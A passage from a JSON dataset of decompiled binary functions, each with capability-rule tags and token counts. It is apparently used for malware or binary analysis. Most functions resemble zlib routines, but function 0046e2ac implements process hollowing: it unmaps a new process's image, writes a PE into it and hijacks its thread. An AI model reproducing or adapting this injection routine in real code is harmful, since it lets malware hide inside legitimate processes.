        "decompiled_code": "\nvoid __cdecl fcn.0046e134(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    \n    if (*(arg_ch + 0xa4) != 0) {\n        for (var_ch = *(arg_ch + 0xa0) + arg_8h; *var_ch != 0; var_ch = var_ch[1] + var_ch) {\n            iVar1 = *var_ch;\n            piVar4 = var_ch + 2;\n            iVar2 = fcn.0040345c();\n            do {\n                if (*piVar4 >> 0xc == 3) {\n                    piVar3 = iVar1 + arg_8h + (*piVar4 & 0xfff);\n                    *piVar3 = *piVar3 + arg_10h;\n                }\n                piVar4 = piVar4 + 2;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 303
    },
    "0046e278": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046e278(void)\n\n{\n    uint32_t *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = sub.kernel32.dll_VirtualAlloc_1(0, 0xd0, 0x1000, 4);\n    *in_EAX = uVar1;\n    uVar1 = *in_EAX;\n    if (*in_EAX != 0) {\n        for (; (uVar1 & 3) != 0; uVar1 = uVar1 + 1) {\n        }\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "0046e2ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e2ac(int16_t *param_1, uchar *param_2)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint *puVar3;\n    uchar *in_stack_ffffff60;\n    int32_t iStack144;\n    uint *puStack140;\n    uchar *puStack136;\n    uint *var_74h;\n    uchar *puStack116;\n    int32_t iStack112;\n    uint uStack108;\n    int32_t iStack104;\n    uint *puStack100;\n    uchar *hProcess;\n    int32_t hThread;\n    uint lpNumberOfBytesWritten;\n    int32_t lpBaseAddress;\n    int32_t lpBuffer;\n    uchar *lpAddress;\n    uint *lpContext;\n    int32_t var_ch;\n    uchar *var_8h;\n    uint var_4h;\n    \n    puStack136 = 0x46e2c5;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    puStack136 = 0x46e2cd;\n    fcn.004059cc();\n    puStack140 = 0x46e514;\n    iStack144 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff70;\n    puStack136 = &stack0xfffffffc;\n    if (var_8h != NULL) {\n        in_stack_ffffff60 = var_8h;\n        puStack136 = &stack0xfffffffc;\n        fcn.004058e0(var_8h, 0x46e53c, var_4h, 0x46e530);\n    }\n    var_ch = 0;\n    if ((*param_1 == 0x5a4d) && (arg_ch = param_1 + *(param_1 + 0x1e),  *arg_ch == 0x4550)) {\n        fcn.00403af4();\n        fcn.00403af4();\n        var_74h = 0x44;\n        puVar3 = &fcn.0046e2ac::var_74h;\n        uVar1 = fcn.004059dc(0, 0, 0, 4, 0, 0, puVar3, &fcn.0046e2ac::hProcess);\n        uVar1 = fcn.004059dc(uVar1);\n        iVar2 = sub.kernel32.dll_CreateProcessA(uVar1);\n        if (iVar2 != 0) {\n            lpContext = fcn.0046e278();\n            if (lpContext != NULL) {\n                *lpContext = 0x10007;\n                iVar2 = sub.kernel32.dll_GetThreadContext(hThread, lpContext);\n                if (iVar2 != 0) {\n                    sub.kernel32.dll_ReadProcessMemory\n                              (hProcess, lpContext[0x29] + 8, &fcn.0046e2ac::lpBuffer, 4, \n                               &fcn.0046e2ac::lpNumberOfBytesWritten);\n                    if (arg_ch[0xd] == lpBuffer) {\n                        iVar2 = sub.ntdll_NtUnmapViewOfSection(hProcess, arg_ch[0xd]);\n                        if (iVar2 == 0) {\n                            lpBaseAddress =\n                                 sub.kernel32.dll_VirtualAllocEx(hProcess, arg_ch[0xd], arg_ch[0x14], 0x3000, 0x40);\n                        }\n                        else {\n                            lpBaseAddress = sub.kernel32.dll_VirtualAllocEx(hProcess, 0, arg_ch[0x14], 0x3000, 0x40);\n                        }\n                    }\n                    else {\n                        lpBaseAddress =\n                             sub.kernel32.dll_VirtualAllocEx(hProcess, arg_ch[0xd], arg_ch[0x14], 0x3000, 0x40);\n                    }\n                    if (lpBaseAddress != 0) {\n                        uStack108 = fcn.0046e1ec();\n                        if (arg_ch[0xd] != lpBaseAddress) {\n                            fcn.0046e134(uStack108, arg_ch, lpBaseAddress - arg_ch[0xd]);\n                            arg_ch[0xd] = lpBaseAddress;\n                            fcn.00408550();\n                        }\n                        puStack100 = &fcn.0046e2ac::lpNumberOfBytesWritten;\n                        iStack104 = arg_ch[0x14];\n                        iStack112 = lpBaseAddress;\n                        puStack116 = hProcess;\n                        var_74h = 0x46e48d;\n                        sub.kernel32.dll_WriteProcessMemory();\n                        var_74h = &fcn.0046e2ac::lpNumberOfBytesWritten;\n                        puStack136 = hProcess;\n                        puStack140 = 0x46e4ad;\n                        sub.kernel32.dll_WriteProcessMemory();\n                        lpContext[0x2c] = arg_ch[10] + lpBaseAddress;\n                        puStack140 = lpContext;\n                        iStack144 = hThread;\n                        sub.kernel32.dll_SetThreadContext();\n                        sub.kernel32.dll_ResumeThread(hThread);\n                        var_ch = hThread;\n                    }\n                }\n                sub.kernel32.dll_VirtualFree_1(lpAddress, 0, 0x8000);\n                in_stack_ffffff60 = lpAddress;\n            }\n            if (var_ch == 0) {\n                sub.kernel32.dll_TerminateProcess(puVar3, 0);\n                in_stack_ffffff60 = hProcess;\n            }\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffff60;\n    fcn.00405554(0x46e51b);\n    return;\n}\n",
        "token_count": 1257
    },
    "0046e674": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e674(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_stack_0000eff0;\n    \n    iVar1 = 0x10;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.00403af4();\n    fcn.0046e640();\n    fcn.0046e670();\n    iVar1 = (**(*in_stack_0000eff0 + 0xc))();\n    while (0 < iVar1) {\n        do {\n            fcn.0046f19c();\n            fcn.0046e670();\n            (**(*param_2 + 0x10))();\n        } while (iVar1 != 0);\n        iVar1 = (**(*in_stack_0000eff0 + 0xc))();\n    }\n    do {\n        fcn.0046f19c();\n        iVar1 = fcn.0046e670();\n        (**(*param_2 + 0x10))();\n    } while (iVar1 != 1);\n    fcn.0046f460();\n    fcn.0046e670();\n    return;\n}\n",
        "token_count": 269
    },
    "0046e7ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e7ac(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_stack_0000eff0;\n    \n    iVar1 = 0x10;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.00403af4();\n    fcn.0046e658();\n    fcn.0046e670();\n    iVar1 = (**(*in_stack_0000eff0 + 0xc))();\n    while (0 < iVar1) {\n        do {\n            fcn.00470aec();\n            fcn.0046e670();\n            (**(*param_2 + 0x10))();\n        } while (iVar1 != 0);\n        iVar1 = (**(*in_stack_0000eff0 + 0xc))();\n    }\n    do {\n        fcn.00470aec();\n        iVar1 = fcn.0046e670();\n        (**(*param_2 + 0x10))();\n    } while (iVar1 != 1);\n    fcn.004719a8();\n    fcn.0046e670();\n    return;\n}\n",
        "token_count": 266
    },
    "0046ebfc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046ebfc(int32_t arg_8h, char *arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *piVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar3;\n    bool bVar4;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (((arg_ch == NULL) || (*arg_ch != *0x490bf0)) || (arg_8h != 0x38)) {\n        uVar1 = 0xfffffffa;\n    }\n    else if (in_EAX == 0) {\n        uVar1 = 0xfffffffe;\n    }\n    else {\n        *(in_EAX + 0x18) = 0;\n        if (*(in_EAX + 0x20) == 0) {\n            *(in_EAX + 0x20) = 0x46e604;\n            *(in_EAX + 0x28) = 0;\n        }\n        if (*(in_EAX + 0x24) == 0) {\n            *(in_EAX + 0x24) = 0x46e610;\n        }\n        var_4h = in_EDX;\n        if (in_EDX == -1) {\n            var_4h = 6;\n        }\n        bVar4 = arg_18h < 0;\n        if (bVar4) {\n            arg_18h = -arg_18h;\n        }\n        var_ch = !bVar4;\n        if (((((arg_14h < 1) || (9 < arg_14h)) || ((in_ECX != 8 || ((arg_18h < 8 || (0xf < arg_18h)))))) || (var_4h < 0)\n            ) || (((9 < var_4h || (arg_10h < 0)) || (4 < arg_10h)))) {\n            uVar1 = 0xfffffffe;\n        }\n        else {\n            if (arg_18h == 8) {\n                arg_18h = 9;\n            }\n            piVar2 = (**(in_EAX + 0x20))();\n            if (piVar2 == NULL) {\n                uVar1 = 0xfffffffc;\n            }\n            else {\n                *(in_EAX + 0x1c) = piVar2;\n                *piVar2 = in_EAX;\n                piVar2[6] = var_ch;\n                piVar2[0xb] = arg_18h;\n                iVar3 = 1 << (arg_18h & 0x1f);\n                piVar2[10] = iVar3;\n                piVar2[0xc] = iVar3 + -1;\n                piVar2[0x13] = arg_14h + 7;\n                iVar3 = 1 << (arg_14h + 7 & 0x1f);\n                piVar2[0x12] = iVar3;\n                piVar2[0x14] = iVar3 + -1;\n                piVar2[0x15] = (piVar2[0x13] + 2U) / 3;\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[0xd] = iVar3;\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[0xf] = iVar3;\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[0x10] = iVar3;\n                piVar2[0x5a6] = 1 << (arg_14h + 6U & 0x1f);\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[2] = iVar3;\n                piVar2[3] = piVar2[0x5a6] << 2;\n                if (((piVar2[0xd] == 0) || (piVar2[0xf] == 0)) || ((piVar2[0x10] == 0 || (piVar2[2] == 0)))) {\n                    piVar2[1] = 0x29a;\n                    *(in_EAX + 0x18) = *0x490b64;\n                    fcn.0046f460();\n                    uVar1 = 0xfffffffc;\n                }\n                else {\n                    piVar2[0x5a8] = iVar3 + (piVar2[0x5a6] & 0xfffffffeU);\n                    piVar2[0x5a5] = piVar2[0x5a6] * 3 + piVar2[2];\n                    piVar2[0x20] = var_4h;\n                    piVar2[0x21] = arg_10h;\n                    *(piVar2 + 8) = 8;\n                    uVar1 = fcn.0046ef18();\n                }\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 1153
    },
    "0046ef18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0046ef18(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if ((((in_EAX != 0) && (*(in_EAX + 0x1c) != 0)) && (*(in_EAX + 0x20) != 0)) && (*(in_EAX + 0x24) != 0)) {\n        *(in_EAX + 0x14) = 0;\n        *(in_EAX + 8) = 0;\n        *(in_EAX + 0x18) = 0;\n        *(in_EAX + 0x2c) = 2;\n        iVar1 = *(in_EAX + 0x1c);\n        *(iVar1 + 0x14) = 0;\n        *(iVar1 + 0x10) = *(iVar1 + 8);\n        if (*(iVar1 + 0x18) < 0) {\n            *(iVar1 + 0x18) = -*(iVar1 + 0x18);\n        }\n        if (*(iVar1 + 0x18) == 0) {\n            uVar2 = 0x71;\n        }\n        else {\n            uVar2 = 0x2a;\n        }\n        *(iVar1 + 4) = uVar2;\n        uVar2 = fcn.0046e8d8();\n        *(in_EAX + 0x30) = uVar2;\n        *(iVar1 + 0x24) = 0;\n        fcn.0047218c();\n        fcn.0046f6f8();\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 373
    },
    "0046f0a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046f0a8(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint in_ECX;\n    uint in_EDX;\n    \n    if ((in_EAX == 0) || (*(in_EAX + 0x1c) == 0)) {\n        uVar2 = 0xfffffffe;\n    }\n    else {\n        iVar1 = *(in_EAX + 0x1c);\n        *(iVar1 + 0x88) = in_EDX;\n        *(iVar1 + 0x7c) = in_ECX;\n        *(iVar1 + 0x8c) = arg_ch;\n        *(iVar1 + 0x78) = arg_8h;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 194
    },
    "0046f148": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046f148(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint32_t arg_10h;\n    \n    arg_10h = *(*(in_EAX + 0x1c) + 0x14);\n    if (*(in_EAX + 0x10) < arg_10h) {\n        arg_10h = *(in_EAX + 0x10);\n    }\n    if (arg_10h != 0) {\n        fcn.0046e62c(*(in_EAX + 0xc), *(*(in_EAX + 0x1c) + 0x10), arg_10h);\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + arg_10h;\n        piVar1 = *(in_EAX + 0x1c) + 0x10;\n        *piVar1 = *piVar1 + arg_10h;\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + arg_10h;\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) - arg_10h;\n        piVar1 = *(in_EAX + 0x1c) + 0x14;\n        *piVar1 = *piVar1 - arg_10h;\n        iVar2 = *(in_EAX + 0x1c);\n        if (*(iVar2 + 0x14) == 0) {\n            *(iVar2 + 0x10) = *(iVar2 + 8);\n        }\n    }\n    return;\n}\n",
        "token_count": 375
    },
    "0046f19c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0046f19c(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    \n    if ((((in_EAX == NULL) || (in_EAX[7] == 0)) || (4 < param_2)) || (param_2 < 0)) {\n        uVar3 = 0xfffffffe;\n    }\n    else {\n        ppiVar1 = in_EAX[7];\n        if (((in_EAX[3] == 0) || ((*in_EAX == 0 && (in_EAX[1] != 0)))) || ((ppiVar1[1] == 0x29a && (param_2 != 0x4)))) {\n            in_EAX[6] = *0x490b5c;\n            uVar3 = 0xfffffffe;\n        }\n        else if (in_EAX[4] == 0) {\n            uVar3 = 0xfffffffb;\n            in_EAX[6] = *0x490b68;\n        }\n        else {\n            *ppiVar1 = in_EAX;\n            piVar2 = ppiVar1[9];\n            ppiVar1[9] = param_2;\n            if (ppiVar1[1] == 0x2a) {\n                ppiVar1[1] = 0x71;\n                fcn.0046f120();\n                if (ppiVar1[0x1a] != NULL) {\n                    fcn.0046f120();\n                    fcn.0046f120();\n                }\n                iVar4 = fcn.0046e8d8();\n                in_EAX[0xc] = iVar4;\n            }\n            if (ppiVar1[5] == NULL) {\n                if (((in_EAX[1] == 0) && (param_2 <= piVar2)) && (param_2 != 0x4)) {\n                    uVar3 = 0xfffffffb;\n                    in_EAX[6] = *0x490b68;\n                    goto code_r0x0046f457;\n                }\n            }\n            else {\n                fcn.0046f148();\n                if (in_EAX[4] == 0) {\n                    ppiVar1[9] = 0xffffffff;\n                    uVar3 = 0;\n                    goto code_r0x0046f457;\n                }\n            }\n            if ((ppiVar1[1] == 0x29a) && (in_EAX[1] != 0)) {\n                uVar3 = 0xfffffffb;\n                in_EAX[6] = *0x490b68;\n            }\n            else {\n                if (((in_EAX[1] != 0) || (ppiVar1[0x1c] != NULL)) || ((param_2 != NULL && (ppiVar1[1] != 0x29a)))) {\n                    param_1 = (**(ppiVar1[0x20] * 0xc + 0x490b80))();\n                    if ((param_1 == 2) || (param_1 == 3)) {\n                        ppiVar1[1] = 0x29a;\n                    }\n                    if ((param_1 == 0) || (param_1 == 2)) {\n                        if (in_EAX[4] == 0) {\n                            ppiVar1[9] = 0xffffffff;\n                        }\n                        uVar3 = 0;\n                        goto code_r0x0046f457;\n                    }\n                    if (param_1 == 1) {\n                        if (param_2 == 0x1) {\n                            fcn.00473388();\n                        }\n                        else {\n                            param_1 = 0;\n                            fcn.004732cc(0);\n                            if (param_2 == 0x3) {\n                                *(ppiVar1[0x10] + ppiVar1[0x12] * 2 + -2) = 0;\n                                fcn.0046e618(ppiVar1[0x10], 0, (ppiVar1[0x12] + -1) * 2);\n                            }\n                        }\n                        fcn.0046f148();\n                        if (in_EAX[4] == 0) {\n                            ppiVar1[9] = 0xffffffff;\n                            uVar3 = 0;\n                            goto code_r0x0046f457;\n                        }\n                    }\n                }\n                if (param_2 == 0x4) {\n                    if (ppiVar1[6] < 1) {\n                        uVar3 = 1;\n                    }\n                    else {\n                        fcn.0046f120();\n                        fcn.0046f120();\n                        fcn.0046f148();\n                        if (0 < ppiVar1[6]) {\n                            ppiVar1[6] = -ppiVar1[6];\n                        }\n                        if (ppiVar1[5] == NULL) {\n                            uVar3 = 1;\n                        }\n                        else {\n                            uVar3 = 0;\n                        }\n                    }\n                }\n                else {\n                    uVar3 = 0;\n                }\n            }\n        }\n    }\ncode_r0x0046f457:\n    return CONCAT44(param_1, uVar3);\n}\n",
        "token_count": 1179
    },
    "0046f460": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0046f460(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if ((in_EAX == 0) || (*(in_EAX + 0x1c) == 0)) {\n        return 0xfffffffe;\n    }\n    iVar1 = *(*(in_EAX + 0x1c) + 4);\n    if (((iVar1 != 0x2a) && (((iVar1 != 0x45 && (iVar1 != 0x49)) && (iVar1 != 0x5b)))) &&\n       (((iVar1 != 0x67 && (iVar1 != 0x71)) && (iVar1 != 0x29a)))) {\n        return 0xfffffffe;\n    }\n    if (*(*(in_EAX + 0x1c) + 8) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    if (*(*(in_EAX + 0x1c) + 0x40) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    if (*(*(in_EAX + 0x1c) + 0x3c) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    if (*(*(in_EAX + 0x1c) + 0x34) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    (**(in_EAX + 0x24))();\n    *(in_EAX + 0x1c) = 0;\n    if (iVar1 == 0x71) {\n        uVar2 = 0xfffffffd;\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 405
    },
    "0046f9bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046f9bc(uint32_t param_1)\n\n{\n    uint8_t uVar1;\n    uint32_t arg_10h;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint16_t uVar4;\n    uint16_t *puVar5;\n    \n    arg_10h = in_EAX[10];\n    while( true ) {\n        uVar2 = in_EAX[10] + -0x106 + arg_10h;\n        if (uVar2 < in_EAX[0x1a] || uVar2 == in_EAX[0x1a]) {\n            fcn.0046e62c(in_EAX[0xd], in_EAX[0xd] + arg_10h, arg_10h);\n            in_EAX[0x1b] = in_EAX[0x1b] - arg_10h;\n            in_EAX[0x1a] = in_EAX[0x1a] - arg_10h;\n            in_EAX[0x16] = in_EAX[0x16] - arg_10h;\n            iVar3 = in_EAX[0x12];\n            puVar5 = iVar3 * 2 + in_EAX[0x10];\n            do {\n                puVar5 = puVar5 + -1;\n                if (*puVar5 < arg_10h) {\n                    uVar4 = 0;\n                }\n                else {\n                    uVar4 = *puVar5 - arg_10h;\n                }\n                *puVar5 = uVar4;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n            puVar5 = arg_10h * 2 + in_EAX[0xf];\n            uVar2 = arg_10h;\n            do {\n                puVar5 = puVar5 + -1;\n                param_1 = *puVar5;\n                if (param_1 < arg_10h) {\n                    uVar4 = 0;\n                }\n                else {\n                    uVar4 = *puVar5 - arg_10h;\n                }\n                *puVar5 = uVar4;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        if (*(*in_EAX + 4) == 0) break;\n        iVar3 = fcn.0046f6ac(param_1);\n        in_EAX[0x1c] = in_EAX[0x1c] + iVar3;\n        if (2 < in_EAX[0x1c]) {\n            uVar1 = *(in_EAX[0xd] + in_EAX[0x1a]);\n            in_EAX[0x11] = uVar1;\n            in_EAX[0x11] = (uVar1 << (in_EAX[0x15] & 0x1f) ^ *(in_EAX[0xd] + 1 + in_EAX[0x1a])) & in_EAX[0x14];\n        }\n        if (0x105 < in_EAX[0x1c]) {\n            return;\n        }\n        if (*(*in_EAX + 4) == 0) {\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 734
    },
    "00470834": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00470834(void)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    \n    if ((in_EAX != 0) && (*(in_EAX + 0x1c) != 0)) {\n        puVar2 = *(in_EAX + 0x1c);\n        puVar2[7] = 0;\n        *(in_EAX + 0x14) = 0;\n        *(in_EAX + 8) = 0;\n        *(in_EAX + 0x18) = 0;\n        *(in_EAX + 0x30) = 1;\n        *puVar2 = 0;\n        puVar2[1] = 0;\n        puVar2[3] = 0;\n        puVar2[5] = 0x8000;\n        puVar2[9] = 0;\n        puVar2[10] = 0;\n        puVar2[0xb] = 0;\n        puVar2[0xd] = 0;\n        puVar1 = puVar2 + 0x14b;\n        puVar2[0xe] = 0;\n        puVar2[0x1a] = puVar1;\n        puVar2[0x13] = puVar1;\n        puVar2[0x12] = puVar1;\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 322
    },
    "004708ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004708ec(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char *in_ECX;\n    int32_t in_EDX;\n    int32_t var_4h;\n    \n    if (((in_ECX == NULL) || (*in_ECX != *0x491522)) || (arg_8h != 0x38)) {\n        uVar1 = 0xfffffffa;\n    }\n    else if (in_EAX == 0) {\n        uVar1 = 0xfffffffe;\n    }\n    else {\n        *(in_EAX + 0x18) = 0;\n        if (*(in_EAX + 0x20) == 0) {\n            *(in_EAX + 0x20) = 0x46e604;\n            *(in_EAX + 0x28) = 0;\n        }\n        if (*(in_EAX + 0x24) == 0) {\n            *(in_EAX + 0x24) = 0x46e610;\n        }\n        iVar2 = (**(in_EAX + 0x20))();\n        if (iVar2 == 0) {\n            uVar1 = 0xfffffffc;\n        }\n        else {\n            *(in_EAX + 0x1c) = iVar2;\n            if (in_EDX < 0) {\n                *(iVar2 + 8) = 0;\n                var_4h = -in_EDX;\n            }\n            else {\n                *(iVar2 + 8) = (in_EDX >> 4) + 1;\n                var_4h = in_EDX;\n            }\n            if ((var_4h < 8) || (0xf < var_4h)) {\n                (**(in_EAX + 0x24))();\n                uVar1 = 0xfffffffe;\n                *(in_EAX + 0x1c) = 0;\n            }\n            else {\n                *(iVar2 + 0x20) = var_4h;\n                *(iVar2 + 0x30) = 0;\n                uVar1 = fcn.00470834();\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 494
    },
    "004709e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004709e8(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    \n    iVar1 = *(in_EAX + 0x1c);\n    if (*(iVar1 + 0x30) == 0) {\n        iVar2 = (**(in_EAX + 0x20))();\n        *(iVar1 + 0x30) = iVar2;\n        if (iVar2 == 0) {\n            uVar3 = 1;\n            goto code_r0x00470ae7;\n        }\n    }\n    if (*(iVar1 + 0x24) == 0) {\n        *(iVar1 + 0x24) = 1 << (*(iVar1 + 0x20) & 0x1f);\n        *(iVar1 + 0x2c) = 0;\n        *(iVar1 + 0x28) = 0;\n    }\n    uVar4 = param_2 - *(in_EAX + 0x10);\n    uVar5 = *(iVar1 + 0x24);\n    if (uVar4 < uVar5) {\n        uVar5 = *(iVar1 + 0x24) - *(iVar1 + 0x2c);\n        if (uVar4 < uVar5) {\n            uVar5 = uVar4;\n        }\n        fcn.0046e62c(*(iVar1 + 0x30) + *(iVar1 + 0x2c), *(in_EAX + 0xc) - uVar4, uVar5);\n        iVar2 = uVar4 - uVar5;\n        if (iVar2 == 0) {\n            *(iVar1 + 0x2c) = *(iVar1 + 0x2c) + uVar5;\n            if (*(iVar1 + 0x2c) == *(iVar1 + 0x24)) {\n                *(iVar1 + 0x2c) = 0;\n            }\n            if (*(iVar1 + 0x28) < *(iVar1 + 0x24)) {\n                *(iVar1 + 0x28) = *(iVar1 + 0x28) + uVar5;\n            }\n        }\n        else {\n            fcn.0046e62c(*(iVar1 + 0x30), *(in_EAX + 0xc) - iVar2, iVar2);\n            *(iVar1 + 0x2c) = iVar2;\n            *(iVar1 + 0x28) = *(iVar1 + 0x24);\n        }\n    }\n    else {\n        fcn.0046e62c(*(iVar1 + 0x30), *(in_EAX + 0xc) - uVar5, uVar5);\n        *(iVar1 + 0x2c) = 0;\n        *(iVar1 + 0x28) = *(iVar1 + 0x24);\n    }\n    uVar3 = 0;\ncode_r0x00470ae7:\n    return CONCAT44(in_EAX, uVar3);\n}\n",
        "token_count": 702
    },
    "004719a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
